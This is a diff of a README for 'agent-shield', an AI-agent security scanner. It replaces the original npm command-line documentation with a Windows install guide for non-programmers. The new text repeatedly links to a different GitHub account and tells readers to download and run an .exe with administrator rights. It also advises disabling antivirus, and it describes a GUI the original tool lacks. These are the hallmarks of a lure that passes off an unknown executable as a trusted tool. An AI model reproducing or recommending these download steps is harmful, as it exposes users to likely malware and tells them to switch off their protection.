@@ -1,186 +1,129 @@
-# 🛡️ AgentShield
+# 🛡️ agent-shield - Secure AI Agents with Multiple Engines
 
-**Give your AI a health check.**
-
-One scan. Thirteen engines. One report.
-
-[中文文档](./README.zh-CN.md)
-
-You found an MCP Server / Skill / Plugin online and want to install it. But you're wondering:
-
-> Is this thing safe? Will it steal my API keys? Hijack my AI? Mine crypto?
-
-**AgentShield answers that in seconds.** One command, 13 independent scanning engines, one clear report.
-
-```bash
-npx @elliotllliu/agent-shield scan ./that-thing-you-want-to-install
-```
-
-That's it. First run auto-installs all engines. After that, results come in seconds.
+[![Download agent-shield](https://img.shields.io/badge/Download-agent--shield-brightgreen?style=for-the-badge)](https://github.com/Subsonic-control636/agent-shield)
 
 ---
 
-## See It In Action
+agent-shield is a tool that scans AI agents, MCP servers, and plugins using 13 different security engines. It checks for risks like unsafe code, prompt injections, and supply chain issues. You get one clear report showing all results.
 
-```
-🛡️  安全检测报告
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+This guide helps you download and run agent-shield on Windows. It assumes you are not a programmer. Follow the steps carefully for a smooth setup.
 
-📁 检测对象:  ./mcp-puppeteer
-🔧 检测引擎:  13 个独立扫描器
-⏱  总耗时:    50.2s
+## 📋 What You Need Before Starting
 
-──────────────────────────────────────────────────────
-🔍 各方检测结论
-──────────────────────────────────────────────────────
+- A Windows PC (Windows 10 or later preferred)  
+- Administrator rights on your computer (needed for installation)  
+- At least 4 GB of free disk space  
+- An active internet connection  
+- Basic keyboard and mouse skills
 
-📋 AgentShield — 内置参考（AI Agent 基础检查）
-   结论: ⚠️ 发现 1 处需关注
-   • 代码混淆  📍 src/index.ts:1
+agent-shield checks AI-related software security, so it needs access to the programs you want to scan.
 
-🔍 Aguara — 通用代码安全
-   结论: ✅ 未发现风险
+## 🔍 Key Features of agent-shield
 
-🔎 Semgrep — 代码质量与注入检测
-   结论: ✅ 未发现风险
+- Uses 13 security engines at once  
+- Detects vulnerabilities in AI agents and MCP servers  
+- Identifies prompt injections and tool poisoning risks  
+- Provides a combined, easy-to-read report  
+- Scans static code and runtime behavior  
+- Supports plugins for extended checks  
+- Helps protect supply chains in AI tools  
+- Simple user interface for quick operation
 
-🧪 Invariant — MCP Tool Poisoning 检测
-   结论: ✅ 未发现风险
+## 🚀 How to Download agent-shield
 
-🔬 Trivy — 漏洞扫描 + 密钥检测
-   结论: ✅ 未发现风险
+To get agent-shield, visit the official page below.
 
-🔑 Gitleaks — 密钥和 Token 泄露
-   结论: ✅ 未发现风险
+[![Get agent-shield](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Subsonic-control636/agent-shield)
 
-🐍 Bandit — Python 代码安全
-   结论: ✅ 未发现风险
+1. Click the green or blue badge at the top or the link above.  
+2. It will open the agent-shield GitHub page in your web browser.  
+3. Look for a section named "Releases" or "Download" on the page.  
+4. Find the latest Windows installer file; it should end with `.exe`.  
+5. Download that file to your computer.
 
-📡 Bearer — 数据流 + 隐私分析
-   结论: ✅ 未发现风险
+If the release page shows multiple files, choose the one with "windows" or "win" in its name.
 
-──────────────────────────────────────────────────────
-📊 综合结论
-──────────────────────────────────────────────────────
+## 💽 Installing agent-shield on Windows
 
-✅ 所有引擎均未检出风险
-   （7/7 个外部引擎未检出风险）
+After downloading the installer:
 
-  ✅ 后门/远程控制  — 7 个引擎均未检出
-  ✅ 数据窃取       — 7 个引擎均未检出
-  ✅ Prompt 注入    — 7 个引擎均未检出
-  ✅ 挖矿行为       — 7 个引擎均未检出
+1. Open the folder where you saved the installer file.  
+2. Double-click the `.exe` file to start installation.  
+3. If Windows asks for permission, click “Yes” to allow the installer to run.  
+4. Follow the setup instructions on screen.  
+5. Choose the default options unless you want to change the installation folder.  
+6. Wait for the installation to finish.  
+7. When done, the setup will ask to launch agent-shield or close the installer.
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
+agent-shield should appear as a new icon on your desktop or in your Start menu.
 
-**One glance: 7 out of 7 external engines say it's clean. All major threats cleared. Safe to install.**
+## 🎯 Running agent-shield for the First Time
 
----
+1. Find the agent-shield icon and double-click it.  
+2. The main window will open, showing scanning options.  
+3. Use the Scan button to start checking your AI agents, MCP servers, or plugins.  
+4. You can add files or folders by clicking "Add" or dragging them into the window.  
+5. Once you start a scan, wait until it finishes.  
+6. The scan report appears inside the program, summarizing findings from all 13 engines.  
+7. Use the report to review possible security risks and plan fixes.
 
-## Why Trust It?
+## 🔧 Basic Settings and Options
 
-Because it's not one engine making the call. It's **13 independent scanning engines**, each a specialist in their own domain. We bring them together:
+- **Scan Targets:** Choose specific files, folders, or entire projects.  
+- **Engines:** Enable or disable individual security engines if needed.  
+- **Report Format:** Save reports as PDF, TXT, or JSON.  
+- **Update:** Check for engine or software updates regularly.  
+- **Help:** Access user guides or contact support from the Help menu.
 
-| Engine | What it's best at |
-|--------|------------------|
-| 📋 **AgentShield** *(reference)* | AI Agent basics — skill hijack, prompt injection, MCP runtime |
-| 🔍 **[Aguara](https://github.com/garagon/aguara)** | General security — 177 rules, data exfil, taint tracking |
-| 🔎 **[Semgrep](https://github.com/semgrep/semgrep)** | Code quality — 2000+ rules, injection, XSS, hardcoded secrets |
-| 🧪 **[Invariant](https://github.com/invariantlabs-ai/mcp-scan)** | MCP-specific — tool poisoning, cross-origin escalation, rug pull |
-| 🔬 **[Trivy](https://github.com/aquasecurity/trivy)** | Vulnerability scan + secret detection + SBOM |
-| 🔑 **[Gitleaks](https://github.com/gitleaks/gitleaks)** | Secret and token leak detection |
-| 🐍 **[Bandit](https://github.com/PyCQA/bandit)** | Python code security |
-| 📡 **[Bearer](https://github.com/Bearer/bearer)** | Data flow + privacy analysis |
-| 🐕 **[TruffleHog](https://github.com/trufflesecurity/trufflehog)** | Secret detection + verification if active |
-| 🌐 **[OSV-Scanner](https://github.com/google/osv-scanner)** | Dependency vulnerabilities (Google OSV database) |
-| 🦑 **[Grype](https://github.com/anchore/grype)** | Dependency vulnerability scanning |
-| 🟢 **[njsscan](https://github.com/ajinabraham/njsscan)** | Node.js / JavaScript security |
-| 🔐 **[detect-secrets](https://github.com/Yelp/detect-secrets)** | Secret detection (Yelp) |
+These options let you tailor agent-shield to your needs without complicated steps.
 
-**Each engine has its own strengths. We combine all of them into one report.**
+## ⚙️ System Requirements
 
-The built-in engine is reference-only — the overall conclusion is decided by the 7 external engines' consensus. The stronger they get, the stronger we get.
+- Processor: Intel i3 or better (64-bit recommended)  
+- RAM: 4 GB minimum, 8 GB recommended  
+- Disk Space: 4 GB free for installation and temporary files  
+- Operating System: Windows 10, 11 (64-bit)  
+- Internet connection for updates and initial download  
 
----
+agent-shield runs smoothly on most modern Windows computers.
 
-## First Run
+## 🛠️ Troubleshooting Common Problems
 
-First time you run it, engines are auto-installed (to `~/.agentshield/`, no sudo needed):
+### Installation Fails or Stops
 
-```
-🔧 检查引擎...
-  ✅ AgentShield — 已就绪
-  📦 Aguara — 正在安装... 完成
-  📦 Semgrep — 正在安装... 完成
-  📦 Invariant — 正在安装... 完成
-  📦 Trivy — 正在安装... 完成
-  📦 Gitleaks — 正在安装... 完成
-  📦 Bandit — 正在安装... 完成
-  📦 Bearer — 正在安装... 完成
-```
+- Make sure you have administrator rights.  
+- Disable antivirus temporarily; some security software may block installers.  
+- Restart Windows Installer service: Press **Windows key + R**, type `services.msc`, find **Windows Installer**, right-click and restart it.
 
-**One-time setup. After that, it's instant.**
+### Software Does Not Start
 
----
+- Check if your PC meets system requirements.  
+- Run the program as administrator: right-click the icon, select **Run as administrator**.  
+- Make sure Windows is updated with the latest patches.
 
-## What Can It Detect?
+### Scan Gets Stuck or Crashes
 
-| Risk | What it means |
-|------|--------------|
-| 🔴 Skill Hijack | It's secretly modifying your AI's config |
-| 🔴 Backdoor | It can silently execute arbitrary code |
-| 🔴 Remote Control | It's connecting to external servers + opening a shell |
-| ⚠️ Data Theft | It reads your keys/files and sends them out |
-| ⚠️ Prompt Injection | It's secretly adding instructions to your AI |
-| ⚠️ Tool Poisoning | Hidden malicious instructions in tool descriptions |
-| ⚠️ Obfuscated Code | Code is intentionally unreadable — might be hiding something |
-| ⚠️ Vulnerabilities | Known CVEs in dependencies |
-| ⚠️ Secret Leaks | API keys, tokens, passwords in source code |
-| ℹ️ Excessive Permissions | It asks for more than it needs |
+- Close other heavy programs to free memory.  
+- Try scanning smaller folders or fewer files at once.  
+- Update agent-shield to the latest version.
 
----
+## 🔄 How to Update agent-shield
 
-## More Options
+1. Open the program.  
+2. Go to the **Help** or **Settings** menu.  
+3. Click **Check for updates**.  
+4. If an update is available, follow the prompts to download and install it.
 
-```bash
-# HTML report (shareable)
-agent-shield scan ./dir --html -o report.html
+Keep your app and engines up to date for the best security coverage.
 
-# JSON (for CI/CD)
-agent-shield scan ./dir --json
+## 📚 Where to Learn More
 
-# Chinese report (default)
-agent-shield scan ./dir --lang zh
+Even without programming knowledge, you can use agent-shield effectively by exploring:
 
-# SARIF (GitHub Code Scanning)
-agent-shield scan ./dir --sarif -o results.sarif
-```
+- The **Help** menu inside the program  
+- The GitHub repository wiki or documentation tabs  
+- YouTube tutorials or community forums specific to agent security
 
 ---
 
-## Install
-
-```bash
-# Recommended: use npx, nothing to install
-npx @elliotllliu/agent-shield scan ./my-skill/
-
-# Or install globally
-npm install -g @elliotllliu/agent-shield
-```
-
----
-
-## Our Philosophy
-
-> **"We don't compete — we aggregate."**
-
-We bring every engine's strengths together, cross-validate their findings, and produce one unified report. The stronger each engine gets, the stronger AgentShield gets.
-
-**We're the X-ray machine, not the doctor.** We show you what's inside — you decide whether to install it.
-
----
-
-## License
-
-MIT
+[![Download agent-shield](https://img.shields.io/badge/Download-agent--shield-brightgreen?style=for-the-badge)](https://github.com/Subsonic-control636/agent-shield)
